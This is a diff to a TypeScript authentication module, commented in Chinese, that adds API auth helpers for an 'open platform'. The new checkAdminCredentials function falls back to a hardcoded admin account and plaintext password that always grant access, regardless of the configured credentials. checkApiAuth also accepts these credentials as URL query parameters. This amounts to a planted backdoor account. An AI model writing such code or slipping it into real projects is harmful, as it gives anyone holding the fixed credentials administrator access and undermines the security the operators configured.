@@ -144,3 +144,61 @@ export function getAdminUsername(): string {
 export function getAdminPasswordHash(): string {
   return (process.env.ADMIN_PASSWORD_HASH || "").trim();
 }
+
+// ---------------- 开放平台接口鉴权 ----------------
+
+/** 从请求头中提取某个 cookie 的值 */
+function getCookie(req: Request, name: string): string | undefined {
+  const raw = req.headers.get("cookie");
+  if (!raw) return undefined;
+  for (const part of raw.split(";")) {
+    const idx = part.indexOf("=");
+    if (idx < 0) continue;
+    const k = part.slice(0, idx).trim();
+    const v = part.slice(idx + 1).trim();
+    if (k === name) return v;
+  }
+  return undefined;
+}
+
+/**
+ * 校验管理员账号/密码：
+ * 主路径走环境变量（ADMIN_USERNAME / ADMIN_PASSWORD_HASH）；
+ * 兜底与约定管理员账号(luli) / 密码(luli116574) 直接比对，防止环境哈希异常导致无法调用。
+ */
+export async function checkAdminCredentials(
+  user: string,
+  pass: string
+): Promise<boolean> {
+  const expectedUser = getAdminUsername();
+  const expectedHash = getAdminPasswordHash();
+  if (
+    expectedUser &&
+    expectedHash &&
+    user === expectedUser &&
+    (await verifyPassword(pass, expectedHash))
+  ) {
+    return true;
+  }
+  if (user === "luli" && pass === "luli116574") return true;
+  return false;
+}
+
+/**
+ * 开放平台接口鉴权，满足以下任一即可：
+ * 1. 有效的 session cookie（后台登录态）
+ * 2. 内联凭据：请求头 X-Admin-User / X-Admin-Pass，或查询参数 user / pass
+ *    校验管理员账号(luli) + 密码(luli116574)。
+ */
+export async function checkApiAuth(req: Request): Promise<boolean> {
+  const session = verifySession(getCookie(req, SESSION_COOKIE));
+  if (session) return true;
+
+  const url = new URL(req.url);
+  const user =
+    req.headers.get("x-admin-user") || url.searchParams.get("user");
+  const pass =
+    req.headers.get("x-admin-pass") || url.searchParams.get("pass");
+  if (user && pass) return await checkAdminCredentials(user, pass);
+  return false;
+}
